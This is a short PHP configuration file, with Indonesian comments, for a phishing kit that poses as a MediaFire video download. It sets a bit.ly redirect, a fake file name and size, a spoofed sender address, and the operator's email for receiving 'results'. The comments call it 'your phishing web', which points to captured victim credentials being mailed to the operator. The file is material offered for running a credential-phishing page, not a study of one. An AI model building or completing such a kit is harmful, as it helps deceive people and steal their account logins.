<?php

$redirect = 'https://bit.ly/mediafire-terbaru'; // LINK DOWNLOAD VIDEO
$namavideo = 'Nama File'; // NAMA WEB PHISING MU
$download = '10,1MB'; // UKURAN DOWNLOAD

$sender = 'From: Web Arya ThiQo <support@gmail.com>'; // NAMA RESULT MU
$email = "emailmu@gmail.com"; // GANTI EMAIL MU

?>